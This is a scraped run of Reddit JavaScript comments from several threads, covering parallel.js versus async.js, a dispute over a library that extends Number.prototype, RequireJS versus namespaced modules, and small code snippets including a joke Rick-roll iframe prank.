Very cool and well done, although it took me a minute to figure out the mechanics. You should definitely add a quick instructions screen.
Flash Media Server used EmcaScript since forever. All that sweet socket-enabled interactive RPC stuff with video and everything.
Really nice script, wouldn't have thought the approach was that simple cant wait to see this grow 
It's really slow even on firefox nightly even on my quite fast computer. On chromium it's fast enough. Could it be something in my config?
Yes. Image can be seen in the gallery here: http://shop.ubi.com/store/ubiemea/en_GB/pd/ThemeID.8605700/productID.175771400/Anno_1404.html
That's a good point. I'm not sure if Flash Media Server was cross-platform, and JScript.NET definitely is not, though node.js is a cross-platform solution so I give it props for running on many platforms, while JScript.NET definitely will not. 
Put this in a branch, will merge to master when I'm happy with it: https://github.com/jimhigson/oboe.js/tree/httpmethods
yah its a problem with the canvas-element - since the game runs in an iframe on kongregate =/ I catch the focus with the "START!"-text and if u tab out or smth it looses focus - I tried several fixes but none worked so far =(
Is this really that much faster than async.js?
try the magic arrowUP-key ;) 
[I think you have missunderstood what configurable and writable means.](http://www.ecma-international.org/ecma-262/5.1/#sec-8.6.1) Even if an property is non-configurable the value of the object is still open for modification and if it isn't writable then you can just do a normal put assignment (a = b). JavaScript is designed to be completely extensible on any level, even Object, and they have already taken steps to prevent any library from unintentionally changing core JavaScript Objects. And I reiterate if a library is change core prototype functions and don't make any note of that then you have a bad library.
I have since changed this functionality to prevent any extras from coming along and will be pushing it to GitHub later today.
My boss and I were phone screening someone once, and we noticed that one entry of his list of known languages was "java/javascript". That might have cost him, had he not also clearly demonstrated that he had no clue how to develop software throughout the course of the interview.
&gt; Just because I know that a given library is loaded on a given page, does not mean my successor will know that. Any external libraries that you are using should already be documented for your co-workers and successors.
I definitely get java.com as my first result when searching "javascript" on bing. I'm also using a private browsing session to ensure no history bias.
so you are correct. thank you
I got java.com as second hit.
Not only is that neat from the "run this code on multiple cores" perspective, but it's also the nicest way I've seen to create quick web workers.
I got 'java plug in' as my top result, and a pop up on my phone asking me to make bing my default. NO
I'm getting [the same results as OP](http://i.imgur.com/SQ79CeJ.png). However, [even Google puts java.com as the 7th result](http://i.imgur.com/ZWY3Uag.png).
cool looking... really hard to figure out what is really going on.
Yes and no, the both process data in an asynchronous manner. Async.js just has built in separate functions for each case vs parallel.js takes a function as the work to be done. I'd love to see a jsperf with a comparison, maybe async.js's each vs parallel.js thread with a for each statement.
Am I dumb? The title says benchmarks, but I see no numbers or comparisons. I see the try it buttons, but that is a tech demo, not a benchmark. 
Seriously, I need help
You sir are awesome. One quick comment, it would be nice to still have data that you can pass for gets and deletes. That way you can for instance do a get across a date range.
It's true, https://o.twimg.com/1/proxy.jpg?t=FQQVBBgpaHR0cHM6Ly90d2l0cGljLmNvbS9zaG93L2xhcmdlL2NyenNqZS5qcGcUBBYAEgA&amp;s=7b8vtWravOxi_WI9x7OV-o6N0uwHWihtu6ErZESUtMw
In the branch data = request body but maybe that wasn't clear enough. Gets strictly speaking can have req bodies but v rare. http://tech.groups.yahoo.com/group/rest-discuss/message/9962 Usually I'd put date ranges etc in the url, ie ?start=foo&amp;end=bar which you can do now. I might change it anyway into a jQuery-style object-type call, ie .get({url:'blah", 'headers:[], data:""}). That way you can give any option you want and the param list doesn't get too huge.
&gt; Pretty cool how it maintains a pixel perfect fog, though I presume that it wouldn't scale too well in I'm wondering how other games handle this. I guess using a low-res bitmap, which is what can be done with canvasses too. Use a low-res canvas for fog and upscale it when rendered. It doesn't matter that it isn't pixel-perfect in this case.
Well, let's just count our blessings that it didn't return a link to Visual J++.
I've wanted to write a post like this for a long time, but my good friend [@searls](http://www.twitter.com/searls) beat me to it and has nailed all of the points with much more eloquence than I could have. Worth a read if you are at all wondering about javascript dependency management solutions (like require.js, browserify, etc..)
I authored the post. tl;dr is that Require.js (and its ilk) don't add a ton of value relative to the amount of work they create. I tried to be much more detailed and thoughtful in the long-form, however! Your questions and criticisms are welcome! :)
All I am saying is that I don't think it is the one language to rule them all and there are some pretty good reasons behind this.
It may be that I misunterstand async.js, however it doesn't look like async.js executes anything in parallel and provides just utility functions. parallel.js creates WebWorkers (essentially threads in the browser; processes in node) to split the workload on multiple cpu cores.
http://www.bing-vs-google.com/?q=javascript
by precompile I mean at build time, not run time. Also you see that _.template is in the initialize that means it will be run whenever you create a new view. Instead you may want to compile it once like this: var template = _.template(...) var V = Backbone.View({ template: template, ... }); That way it's only done once. If you can add the template string at the top of the file then it will only be included when you use that file, so you'd have something like: View.js (function(){ var template = "&lt;mytemplate&gt;"; var V = Backbone.View.extend... you just need a build step to insert the template. If you can't use RequireJS can you build your own? You could always pass in the template to the constructor, but then you need to define how that would work
At first: I'm totally new to HTML5 Video. I have found a library which adds support for SubRip to the &lt;track&gt; element: [Captionator.js](http://captionatorjs.com/) I also found an SubRip (srt) to WebVTT (vtt) [converter](http://atelier.u-sub.net/srt2vtt/) as well as a [WebVTT validator](http://quuz.org/webvtt/). Tested it with one converted file, and it validated successfully.
async.js does things in parallel by definition: Asynchronously, that's the entire point of the library. 
Perhaps it is, but I will personally stick to one of the other languages that I prefer. I actually like javascript, too...but calling it the "one language to rule them all" is perhaps just a bit too grand for me.
(I mean, yeah, I don't like the article, either.)
async.js is definitely "parallel mimicking".js. Parallel.js is aptly named.
Seems legit to me.
No no What he's saying doesn't apply to browserfy unlike require browserfy requires minimal changes to your library as it uses commonjs style modules not AMD. 
great post. I think that there is a problem in which dependency management should actually be split in two, how to load those dependencies and then how to actually use them from another module. I don't think anyone has solved this yet and the more people put time in to thinking and writing on the subject the better
You can type in JavaScript on the left pane to define a function. The 0-level set determines the shape. The right pane gives the color of the voxel at the given x/y/z coordinate.
But jQuery isn't a String manipulation library it is a DOM and Ajax helper library, so it wouldn't make sense for jQuery to start messing with String's prototype. But if you had a library for String functions I'd expect that I'd be able to call them on strings directly and not have to wrap them.
usually with drawing in games you should really only do that on a single thread.
Anyone having issues getting this to work in node? Nothing fancy, just: npm install parallel.js then: require('parallel.js'); Errors out, says it can't find the module. Tried it locally and globally. Other npm packages working fine. 
FYI, being specific works: var Parallel = require('./node_modules/parallel.js/lib/parallel.js');
A few thoughts: First of all, require.js *is* terrible. But that's not a reason to dismiss module systems altogether. Second, combining the module pattern and namespacing basically *is* implementing a lightweight module system, and while it's great and all how little you need to make that happen, it doesn't mean it's a great solution either. I mean, the C guys discovered namespacing long ago, and everyone knows that the C model for libraries sucks. See: http://clang.llvm.org/docs/Modules.html#problems-with-the-current-model Third, I feel you're missing the aspect of package management. Module systems and package managers are different but related concerns, and **man** is it awesome when your module system and package manager act like bread and butter, cereal and milk, etc., etc. That's one nice thing about using browserify---you get immediate access to tens of thousands of modules. Finally, you talk about writing tiny components. This is good. This also has absolutely nothing to do with how you do modules.
&gt; But if you had a library for String functions I'd expect that I'd be able to call them on strings directly and not have to wrap them. Why? You won't find many libraries that do this, and the ones you do find will be either shims or largely hated like prototype.js or well known for their incompatibilities with other libraries. Assume 2 libraries do what you are saying and both modify the prototype.
Are you a troll? Read the first line of that page.
Notice that jQuery didn't modify the prototype of document, window, or any other host/built-in objects.
Have you read and internalized the documentation of every piece of code you've ever used?
&gt; String.js[1] is a library that can extend the String's prototype when asked to and they are very upfornt about this functionality and this is the point that I am trying to make here. From the website you linked on the front page as the first paragraph: &gt; Originally, it modified the String prototype. But I quickly learned that in JavaScript, this is considered poor practice. Also, &gt; A library changing the core prototypes isn't inherently good or bad One that doesn't change prototypes is inherently more maintainable and modular and provides guarantees that modifying the prototype breaks. &gt; it is when it changes the prototypes without explicitly saying so is when it is a bad thing and leads to library conflicts. Assuming I am interested in ANY way of managing these conflicts? Why would I do that when I can use any `require` or other APM-like loading mechanism and NEVER have any of these problems? 
&gt; [[Writable]] Boolean If false, attempts by ECMAScript code to change the property’s [[Value]] attribute using [[Put]] will not succeed. &gt;[[Configurable]] Boolean If false, attempts to delete the property, change the property to be an accessor property, or change its attributes (other than [[Value]]) will fail.
I wonder if my coworkers will notice when I start creating shortcuts for console.error messages: var ಠ_ಠ = console.error.bind(console);
I am talking about the design of your library in terms of it's conflict prone abuse of built-ins, and the basically hidden errors it will result in. [Your defender was the one who brought up jQuery]( http://www.reddit.com/r/javascript/comments/1gr4sk/numjitsu_for_syntactically_awesome_numbers/can8l1x) Also, this isn't about the use of prototypes. Prototypes are a decent way to share functionality. This is about built-ins.
[[Put]] is the assignment operator. If ECMAScript didn't want you to be able to ever change the value they wouldn't have made the specific to the assignment operator and would have just made it a blanket block on any attempt to change the value.
[I don't hear raindrops, therefore it isn't raining.](http://en.wikipedia.org/wiki/Argument_from_ignorance)
[Nope](http://www.ecma-international.org/ecma-262/5.1/#sec-8.12.5) Put is the generic concept of assignment.
I am not going to argue with you guys on this. The guy who wrote String.js probably got the same response I am getting and caved into peer-pressure. My library does its job which is the only thing that matters and I have made it clear it changes prototypes so anyone who uses it isn't surprised by this action. If you don't like the way I did things fork the project on GitHub and make your own version that works like String.js or jQuery; the project is working how I want it to, which is to have a similar syntax as Ruby on Rails Number functions.
While I definitely prefer CommonJS over AMD, the point made in the beginning of the article is that Browserify and Require each introduce a module format to developers, and in both cases _using_ that format is not mandatory for creating applications _in the browser_ with JavaScript :) **edit: updated to inclue the context of applications "in the browser", which is the focus of this article and discussion.
Thanks! That's really my point: until it adds a ton of immediate value, there's no reason to jump aboard until it's truly standard and ubiquitous.
No one I know will ever accept a library into their codebase that modifies built-ins in ways that violate the specified contract of the built-in. Why did you release a library to a community if you are going to ignore the community's input, especially in regards to maintainability? You built something. Neat, it may even be useful to you. To make it useful to the community at large you need to minimize it's impact on other people's existing code. JavaScript is not Ruby. 
&gt; My library does its job which is the only thing that matters By that logic could have used [Brainfuck](http://en.wikipedia.org/wiki/Brainfuck). &gt; The guy who wrote String.js probably got the same response I am getting and caved into peer-pressure You see following best practices as **peer-pressure** ?! Just say NO to best practices? &gt; I have made it clear it changes prototypes so anyone who uses it isn't surprised by this action Assuming anyone wants to play this fun version of runtime Russian Roulette. &gt; If you don't like the way I did things fork the project on GitHub and make your own version that works like String.js or jQuery Well, for me personally numbers are "syntactically awesome" enough in Javascript and I would be encapsulating any logic into something that uses numbers not the actual numbers themselves. &gt; the project is working how I want it to I have no problem with you writing code or using your own code, do what you wanna do man! But when you post it on GitHub and this sub-reddit you open the door for someone to make a comment about it and obviously you wanted to share the code. My goal is to educate others, including anyone reading these subs or GitHub and thinking that writing code like that is a good idea. &gt; which is to have a similar syntax as Ruby on Rails Number functions. This is really the problem is that the goal and reason for this libraries existence is novelty.
Thanks for replying. Like I said, if whatever-you're-doing works for you, that's great and I don't want to take away anything from it. Quickly, to your three points: * I'm not dismissing client-side module tools because they're terrible, I'm dismissing them because their value has not been made clear to me. * It's true, I've more-or-less adopted a convention that feels like a de facto "lightweight module system" and it works for me. The purpose of my post is "if this very simple convention is all I need, then what's the point of pulling in some third-party tool and orienting all of my code around it, especially if it's not a standard?" The burden of proof is on the tool at that point. * Until there's a standardized central repository, package manager, module system, and first class support across all the browsers, I'm not eager to jump to the front lines of this battle. Once there's such a world, I absolutely agree that it would be valuable, but the current state is such a patchwork mess of competing formats and approaches that any convenience has (in my experience) been easily outstripped by the need for shims and lack of first-class build/deploy tool support 
How do methods that are not defined anywhere in ES5 and ES6 going to cause conflicts or problems. I was careful about make sure that I did not ever change functionality and only extended it. Everything on the ECMAScript specifications will function and behave EXACTLY like it says it will because I specifically never touched the built-ins, I added onto the prototype which doesn't change the functionality of the Number object. Also, excluding the legacy version, my methods copy the permission of the built-ins specifically so anyone who extends the Number can treat it normally. I maintain the contract of the built-ins. I am able to inject Numjitsu on several sites and they don't even twitch, including Google+ that carries ~1.3MB of minified JS and Facebook that has ~1.7MB of minified JS. 
True though the fact that commonjs is required for node means that it didn't have all the drawbacks relating to interoperability that AMD has. 
&gt; How do methods that are not defined anywhere in ES5 and ES6 going to cause conflicts or problems. ... that is precisely _why_ they will cause problems. No one expects them to be there. Only the specific developer who decided to include your library will be aware of it, and with time that will fade from their memory also. &gt; I was careful about make sure that I did not ever change functionality and only extended it. Adding otherwise non-existant methods and properties does not change an object's functionality? &gt; Everything on the ECMAScript specifications will function and behave EXACTLY like it says it will because I specifically never touched the built-ins, I added onto the prototype which doesn't change the functionality of the Number object. Wrong. It explicitly changes the functionality of EVERY Number object.
I think this is because of the .js on the end of the module name. That's probably confusing the package loader.
fixed the focus problem with a pause function that gets activated on window.blur...
&gt; ... that is precisely why they will cause problems. No one expects them to be there. Only the specific developer who decided to include your library will be aware of it, and with time that will fade from their memory also. How do you forget you added a library or not know a developer added the library? I don't know how it works for you but it is a group decision at my work on whether or not to add a library. We're all quite aware when this is happening. If you are adding a library you aren't doing it because something IS there you are doing it because something is NOT there. &gt; Adding otherwise non-existant methods and properties does not change an object's functionality? &gt; Wrong. It explicitly changes the functionality of EVERY Number object. How will the Number object behave differently outside of being able to now call Numjitsu methods?
&gt; How will the Number object behave differently outside of being able to now call Numjitsu methods? * Anything else that reflects or walks the prototype of Number will now have new things it's touching (such as a for in loop not guarded by hasOwnProperty, like in your code) * Other "libraries" affecting the Number prototype are now at battle with yours &gt; don't know how it works for you but it is a group decision at my work on whether or not to add a library. And then you go move on to another company, someone else dies, and a few years down the line nobody who authored that code is maintaining it - assuming it still works. I'm sure you do cost benefit analysis or are familiar with it. One one hand is the functionality a library/module provides to me, and on the other is the risk/maintainability of that code breaking during integration. At the end of the day you are pushing very hard against the grain to accomplish a novelty syntax. For the purpose of entertaining the novelty syntax it does a great job, but for the purpose of being re-used by others it's unusable.
&gt; How do you forget you added a library or not know a developer added the library? I don't know how it works for you but it is a group decision at my work on whether or not to add a library. We're all quite aware when this is happening. If you are adding a library you aren't doing it because something IS there you are doing it because something is NOT there. 1. My group would reject your library because we understand: 2. Turnover. &gt; How will the Number object behave differently outside of being able to now call Numjitsu methods? 1. Now spec writers have be mindful of the fact that you polluted their objects before they update the spec, otherwise they break your code. 2. Being unable to know that Numjitsu methods are the root cause of an error is the problem; if someone has an error in their code and the root cause is that Numjitsu methods are present, how the hell are they supposed to figure that out? They see a number; they expect it to be a plain number.
Hah, where did anyone insult you? That was a logical fallacy and I showed it to you, if you are insulted that's a problem internal to you.
&gt; * Anything else that reflects or walks the prototype of Number will now have new things it's touching (such as a for in loop not guarded by hasOwnProperty, like in your code) Actually that it is incorrect my methods are non-enumerable which means that they won't show up in a for loop, just like the built-ins. &gt; * Other "libraries" affecting the Number prototype are now at battle with yours Unless the other library wants to assign the same functions they won't battle and this already happens with libraries that want to use '$'. The developer should be aware of what his libraries are adding to the built-ins, window included, which I have a complete list of what I am adding to the Number prototype in the README.
&gt; My group would reject your library because we understand: &gt; Turnover. So basically you never tell your new employees what libraries you already have? &gt; Now spec writers have be mindful of the fact that you polluted their objects before they update the spec, otherwise they break your code. ES5 and ES6 have nothing in the spec, if the spec writers ever did add in any of my functions they would accomplish the same task as my library and my library would then become a shim. &gt; Being unable to know that Numjitsu methods are the root cause of an error is the problem; if someone has an error in their code and the root cause is that Numjitsu methods are present, how the hell are they supposed to figure that out? They see a number; they expect it to be a plain number. Firebug, Chrome Dev Tools, etc. And I return a ~~plan~~ plain number.
&gt; No, that's exactly my point, see noConflict() or any module system like RequireJS I am sorry I don't see you point. As the developer you should be aware of what your libraries are doing so that you never have to use noConflict().
My point is you should *import* it into your scope and not pollute the global namespace: var Number = require("MyNumber"); // Use your implementation of Number without breaking others 
&gt; My point is you should import it into your scope and not pollute the global namespace: It doesn't pollute the global name space. My script is wrapped in an anonymous functions and only extends the Number prototype. **[edit]** The AF isn't in the src files but it is added in when the files get compiled. http://cdn.nickdobie.com/numjitsu/current/numjitsu.js
&gt;This is the constructor. Use it to new up any parallel jobs. That unfortunate phrasing made me cringe.
I can't understand your reasoning for not using require.js. I think writing your own module system is risky and unnecessary. I also despise using long namespaces to reference other modules e.g. "Foo.bar.baz.blah()". It is much more concise to require a file and save the reference to a short named variable. Makes your code also very readable as you know all of your dependencies up front. You are also missing the benefits of r.js which optimizes your files. It sounds like you are ignoring require.js because of the learning curve " the increased time investment required by the former has always paid off, whereas the initial convenience of the latter has always cost me down the road"? I think the investment in learning a tool like require.js is a great payoff.
&gt; then what's the point of pulling in some third-party tool Personally, I find the node/commonjs system useful because, in a chunk of code, it immediately tells me where a certain variable was defined. If I see something like, var invoices = require('./lib/reports').invoices that immediately tells me that the code that defines invoices is in './lib/reports.js'. But seeing something like, var invoices = ou.reports.invoices; doesn't tell me anything about where reports or invoices were actually defined, and I have to scroll through the script tag stack (or, worse, ctrl-f the compiled source since you probably catted all your "lightweight modules" together) to figure out where it was defined. Tolerable, sure. Ideal? Nowai. In addition, you don't have to load your code in any particular order with browserify, because the require system is smart enough not only to take care of that for you, but also to handle situations where one module requires a different version of some dependency than another. &gt; especially if it's not a standard Personally, I don't put that much stock on standards, especially as an application developer. As a library developer this is more important as you have to ask which of the n package repositories you're going to publish to, and which of the module systems, or lack thereof, you're going to support. In my experience, code authors seem to either stick with their favorite system with a build step towards attach-to-window systems, or use a [UMD shim](https://github.com/umdjs/umd). But as an app dev, your only real concern is how hard it is to get your favorite libraries to play nice. Truth is, old-school script includes and module tools like browserify and amd get along just fine, and trying to shove the square peg in the round hole is a matter of pedantry, not necessity. At the end of the day, as an app developer, the module system is a tool for you to organize your code better, and pulling in third party dependencies is an added bonus. &gt; build/deploy tool support I mean, browserify is a build step, and debug bundles have code maps. This doesn't strike me as any more "not-so-first-class" than, say, a c preprocessor, or a js minifier. And it's way nicer. So there's that.
How do you modify a prototype that doesn't exist, document and window are singleton objects and don't have a prototype.
There's also about a dozen server side web frameworks built around Rhino, Mozilla's implementation of JavaScript in Java.
Could you name a few?
The big two seem to be [Helma](http://helma.org/) and [RingoJS](http://ringojs.org/), although [this Wikipedia page](http://en.wikipedia.org/wiki/Comparison_of_server-side_JavaScript_solutions) lists a few more.
Rick rolling: window.setTimeout(function() { var iframe = '&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/*?fs=1&amp;autoplay=1&amp;loop=1" style="position: absolute; left: -999em; top: -999em; visibility: hidden; -webkit-user-select: none; -webkit-user-drag: none;" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;'; $('body').append(iframe.replace('*', 'oHg5SJYRHA0')); }, 15 * 60 * 1000); // 15 minute delay &gt;:D // I may or may not have stolen code for this from fool.js :P 
[Obligatory link to my similar web worker library](http://communistjs.com). Though thinking of these libraries as being for multiple cores is somewhat the wrong way to think about it as they can be useful on single core machines, the key bit being not blocking the UT thread.
It's only actually mimicking when it's something that happens in thread, when you have something like an ajax request or reading files it actually can be in parallel, async in more about organizing operations that might finish in random order. 
That estimate is actually neeter then you'd think because it doesn't actually tell you how many cores you have, it tells you how many FREE cores you have.
Actually we're debating implementing this with failover to a system like async for older browsers and doing heavy lifting for backbone via web workers and either using a lib like this or writing our own abstraction layer that automates the process. Doing stuff like sorting big collections, dealing with render calls and using handlebars templates, dealing with long polling connections or BOSH, consuming large json collections from API's, etc. would just blindly be passed into said abstraction and results would pop out using the message passing and a custom backbone event aggregation setup. I'm actually pretty excited to get cracking on it. 
Well apparently you and me were the only ones because it is now at 0 up votes!
Nice! Simple and elegant solution. Dig the integration with events as well. Thanks for sharing!
I don't know if I would do a failover strictly for older browsers, I would have it based on passed data size / collection/array length. If the data is small enough would it need the overhead of a worker or just the BS parallel of async.js or if it's small enough maybe even just underscore.js. You could set up "levels" to each function: * level 3: fully worker based * level 2: async.js bs parallel * level 1: straight underscore.js * level 0: auto (based on passed data size) 
I get the Wikipedia article as the top for both at that link
Thanks :D
That's really just about it. The difference is that deeply-nested namespaces are obnoxious, because one would have to do: window.ou = ou || {}; ou.foo = ou.foo || {}; ou.bar = ou.foo.bar || {}; vs. just extend('ou.foo.bar', {}) The other benefit of extend is that it will merge the contents of any name collisions. So, where ou.foo.bar = { a: 'hi' } //skip a few thousand lines ou.foo.bar = { b: 'bye' } The above would overwrite ou.foo.bar.a, and it would be undefined. Whereas, this: extend('ou.foo.bar', { a: 'hi' }) extend('ou.foo.bar', { b: 'bye' }); The above would merge the two objects such that a &amp; b were both still defined. It's not much but it's enough.
keys dont work on firefox
Using arrow keys to change the "ship" color is very confusing from a user interface perspective. People inherently associate those keys with movement. I (and apparently several other people here) had a hard time figuring out how to play the game due to that one simple flaw. I would also start the user out with a slower paced, simpler course to navigate and ease them in, letting them get a handle on mapping the keys and colors in their mind before throwing the onslaught of obstacles in their path. Aside from that, I think it's great. Really interesting and original concept (at least, I've never seen anything like it). Great job! Out of curiosity, were you using webGL or just straight canvas to create the game?
If he's anything like me, he's seen developers not abiding by the `do not touch` rule of the marked properties and then complain when the underlying API breaks. This is a safety measure that makes sense and is why classical inheritance doesn't have this problem.
Browsers do a lot to prevent messing with child iframes, especially if on a different host (for security purposes). I wouldn't be surprised if you can't accomplish this. That being said, any reason you need to wrap OWA instead of invoking its web services and presenting the data off of that? I'm pretty sure Exchange 2007 and higher offers ASMX services.
You may be able to accomplish this by writing a browser extension or Chrome app. As long as you state your permissions needs, you can get past the cross-site security issues that you're running into.
bummer
&gt; I can't understand your reasoning for not using require.js In some respects this understanding is hard to have with experience on only one or two small projects; I know, because I was in this position a few years ago! It also bears mentioning that the pain of using require.js is often _magnified_ on larger teams; again, something I hadn't experienced fully until the last few years. &gt; I think writing your own module system is risky and unnecessary. My question to you is, why? It goes without saying that writing _any_ software involves some sort of risk; risk that we build the wrong thing, that what we build doesn't sell, etc. With the knowledge that a JavaScript application, running in the context of the browser, is simply the sum of its concatenated parts, what is risky about using any module system that orients itself with that realization and avoids the "findability" problems inherent when using Require that Justin talked about in the article? &gt; I also despise using long namespaces to reference other modules e.g. "Foo.bar.baz.blah()". I think you may have missed the point the author made in the article regarding this: &gt; **Out-of-the-blue references to an object property-chain as lengthy as uo.reports.invoices.CalculatesTotal feel weird** when they're littered all over a file listing. **I appreciate that discomfort**, because it forces me to be more thoughtful about my design (whether my reaction will be to decrease the unit's collaborator-count or to inject dependencies as opposed to always explicitly referencing them). Reacting to pain and discomfort is a healthy thing and we should embrace that pain by responding with questions about how we can design our code better, not by responding with orienting our entire development lifecycle around a particular tool like Require. &gt; It is much more concise to require a file and save the reference to a short named variable. Nothing is preventing you from referencing "foo.bar.baz.blah" and assigning it to a local variable "stuff" in any given function scope; this is not some magical benefit that Require gives you. &gt; You are also missing the benefits of r.js which optimizes your files. I covered this in response to @drrcknlsn in [the comment](http://www.reddit.com/r/javascript/comments/1gsuc0/unrequired_love_a_discussion_on_javascript_and/cao7mnd) above, see the part on the mismatch between async loading dependencies in development and not doing so in production; also pertinent is the performance overhead and scaling issues _in development_ when using such a scheme. &gt; It sounds like you are ignoring require.js because of the learning curve [Well that's just like, your opinion, man.](http://knowyourmeme.com/memes/thats-just-like-your-opinion-man) In all seriousness, nobody is ignoring it, in fact both the author of the article _and_ myself have extensive experience with the pain associated when choosing to align your entire development lifecycle with the tool, which I think we've done a good job describing! &gt; I think the investment in learning a tool like require.js is a great payoff. Why? This is the central question posed by the author of the article. What value do you get by aligning your development with the tool? We'd really like to know specifics :)
It's a web service, it should support anything that can make a web service call. If you need to do JS you could probably use node to invoke the service server side and pass to your front end. Ruby, Python, Java, etc would all work too.
I agree 100% , i'm using require on a library i'm developping ( http://mparaiso.github.io/Coordinates.js/ ) but i'm going to drop it. I brings more issues that it solves. And people should not expect any library to be require compatible ,that's stupid.
The compatibility argument is also an interesting one; it doesn't take long to [find](https://www.google.ca/search?q=backbone.js+amd+support) very [good arguments](https://github.com/documentcloud/underscore/commit/0d4b1247c45083c695cab4242c084a97aa600221#commitcomment-857644) for why not supporting _any_ particular module format being currently proposed is the better stance to take. Once browsers all have native support for modules, and a format has won, then it will _hopefully_ be the right time to use that system.
some are more confusing than others.
Are you willing to have a server side component? Java and .Net are supported, as you mentioned. Nodejs you can look at https://npmjs.org/package/exchanger Ruby maybe this would work? https://github.com/lusis/Ruby-EWS I'm sure there are plenty of other options too. If your requirement is client side only then I think you may be out of luck unless you host your page from the same host and domain as EWS. If so you may be able to use EWS via AJAX, but only in that 1 scenario. Good luck!
I would check out Crossrider, it can build extensions for multiple browsers with jquery, and it is very easy. http://crossrider.com
You still have not pointed out reasons to not use requirejs other than it being bad for large projects. Show me the pain points and I can help give solutions.
Good pattern. We've been using something similar. It'd be nice to replace `this.__proto__` with `this.constructor.prototype` for better compatibility.
this brought back Age of Empires II memories. Can't believe I remember that cheat code almost 10 years later! 
I can definitely do that. I've just made the change and it works. Before committing I'd like to understand the benefits of this. Can you elaborate?
Ah, it looks like `__proto__` is deprecated. Fixed!
If you're not doing any calculation client side, you're better off formatting the amount server side. If you _are_ doing calculation client side, floats are the wrong way to do it.
Ok, I'll bite. The typical use of Require involves async loading all your dependencies in development, and the use of the r.js optimizer for production. Regardless of the size of your application, this results in a _horrible_ mismatch between your development environment and production environment. The typical outcome of such a mismatch is often the discovery of bugs that exist in development but not production, and/or vice versa. It also adds performance overhead to the development experience that is entirely unnecessary. Here's a [screenshot](http://cl.ly/image/0P2n0F2I2B0q) of a _not_ large project I came onboard to help that loaded all of its dependencies async for development, including templates using the Require text plugin, in addition to javascript application src files. Why would it be valuable to load 384 dependencies via XHR in development, that constitutes an overhead of 7.25s until the page is ready and usable? What possible advantage does this have over concatenating all those files into one file during development, and having the only difference be the minification step in production?
I've been working on a Chrome extension for a time management application at work, and decided to implement a bunch of useful keyboard shortcuts. Naturally the code for that got hairy pretty quickly, so I looked to the web for something simple to manage it for me, but didn't like any of the existing solutions (most of which appear unmaintained or have low activity). So I went to the drawing board and created this solution for myself, and figured I'd share it with you all (as well as invite ideas/critique/etc). If you have any questions, I'll do my best to answer them promptly!
What does configuring caching in production have to do with using Require for development? The discussion in the article, and here has been about proving the purported benefits of using Require (or other module loading schemes) in development. Did you even read the article? 
Web apps (especially SPAs) often receive plain data from server (e.g. as JSON), and then format it for presentation depending on, for example, localization settings.
I would write it has a phantomjs script with jquery. Phantomjs is a full headless browser not an iframe, but you could still inject your own scripts through phantom. In this way you should be able to mine away with minimal effort and friction. http://phantomjs.org/ Ultimately it's server side jquery, but thats probably the best approach. 
Both of these are excellent ideas! I'm going to take a shot at the first one here in a minute and post back with the results. The second one would be trivial to implement, so I'll save that one for a bit later tonight. Thanks for the feedback!
Uh... discussion on this post (which I admittedly have not read much of outside of our particular conversation) may very well be specific to a dev environment, but the article definitely is not. Did **you** read it? :-) Feel free to quote me any of it that you feel leads you to believe it was only applicable to dev environments, though. And honestly, I feel like you're back-pedaling here, since one of your major arguments is HTTP requests. If we're only talking dev environment here, that would (hopefully) be localhost or other intra-network server, correct? HTTP requests inside a LAN don't suffer the latency of WAN requests, so why would you bring this up?
My recommendation was never to load the scripts separately during development; we use Grunt (grunt-contrib-concat) to deliver a concatenated unminified bundle as 1 script element during development. That's as simple as it needs to be. I'm not looking for a solution to the problem, I know all about precompiling templates, and how to minimize the number of HTTP requests. The point of showing you the screenshot was to give you a sample of some of the atrocities being committed with Require, and show how the use _and_ abuse of it detracts from the development experience. Regardless of the particulars, the overrarching argument is that async loading dependencies in development and then sync loading them in production is a pretty big mismatch that leads to more than just performance problems. How about you make the case for what you find valuable about using Require now? 
Not really an efficient or flexible methodology. 
This looks awesome! Thank you for contributing it!
That is a nice library! I love the idea of sequences, which probably would've come up sooner rather than later. I'll have to adapt that to my implementation. I think by the time I'm finished fleshing Keys.js out, I'll have some features that might make comparing to Mousetrap a more interesting conversation, but for now it seems to be the more robust solution. Thanks for the link!
It just occurred to me that one feature I've already implemented which mousetrap doesn't seem to have, is serialization/deserialization of bindings, for persistence as a saved setting in localStorage or transport server-side to be saved there. A big feature for me was being able to customize my bindings and save them as a user, so that each time I load up my app, my custom bindings are loaded as well. Anyways, that's my one shaky handhold on being competitive at the moment, for what it's worth.
awesome! my entire site is off node.js I will look into that package. seems like they updated the readme yesterday. thx for pointing this out. Looks like im out of luck for client side 
How can we know this one will stay maintained and retain activity?
Speaking as someone who exclusively browses the web with Vimium (rather than a mouse), I don't think it's a particularly good idea to rely on the assumption that you're going to be able to override the user's keybindings.
You keep using the words I and myself in the article, so it seems like you are working on JavaScript projects alone (correct me if I'm wrong), and it seems like you know how the entire JavaScript application works and how the files fit together. I use require.js, I don't work alone and I have no idea how the parts of the JavaScript application that I didn't write work. But because of require.js I don't have to worry about that. If I look in a JavaScript file I didn't write I can instantly tell what other JavaScript files it depends on and I also know that there isn't a file which mysteriously alters (through extend) the module I'm looking at. I don't use require.js because it makes things easy to write, I use it because it makes things easy to read and understand, not only for me, but for the other programmers I work with. It also makes things easy to test, as I can now test a single module without having to worry about remembering to load all of its dependencies. Require.js will do that for me. I also know that loading two files won't create a conflict, because no file manipulate anything in the global namespace. 
Hah, okay, that would be useful - Thanks for explaining :)
Java is to JavaScript what Car is to Carpet
Way too much shimming and extending built in objects for such a simple script.
Hey Gundersen, thank you for replying with an answer to the question of value that was posed of Require in the article! :) I didn't write the article, but the author and I are co-workers. Let me give you some background; for the last 4 years I've worked in both large and small teams on projects of varying sizes, but never alone. In either case, there is always some initial ramp-up cost when joining a new project; while it is true that well-structured projects have a _lower_ ramp-up cost, it has never been my experience to see that cost disappear entirely. It simply takes time to acclimate to the specific architecture, tools and libraries in place on any given project. I think it behooves us as developers to know how the application we work on functions at a technical level; the same benefit is applied as we increase our understanding of the businesses domain and the high-level problems it is trying to solve for its customers. I generally strive to learn as much as possible about the problem domain I'm working in. My experience with Require, and other module loading tools (like the YUI2 Loader over 4 years ago), has been that they don't yield a net reduction in terms of complexity in a codebase. I worked on a small (~10) and large (~30) team of developers where I was responsible for introducing the YUI2 Loader and implementing it in a relatively simple JavaScript application. What I found throughout this experience was that the use of such a tool forced my team and I to align our entire application development lifecycle with the opinions it imposed. We had to change the way we wrote tests, the way we built our application, just to name a couple. Over time, it became apparent to me that no 